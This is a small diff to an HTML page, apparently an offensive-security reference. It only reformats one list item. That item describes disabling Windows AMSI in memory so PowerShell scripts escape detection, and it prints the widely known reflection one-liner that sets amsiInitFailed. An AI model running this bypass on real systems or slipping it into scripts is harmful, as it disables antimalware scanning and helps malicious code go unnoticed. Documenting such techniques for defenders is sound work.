@@ -85,9 +85,9 @@
   <ul>
     <li>Deactivation of AMSI (Antimalware Scan Interface) in memory to run PowerShell scripts without detection.</li>
     <li>Example of AMSI bypass in PowerShell:
-    <code>
-      [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic, Static').SetValue($null, $true)
-    </code></li>
+      <br/>
+    <code>[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic, Static').SetValue($null, $true)</code>
+    </li>
     <br/>
   </ul>
 </ul>
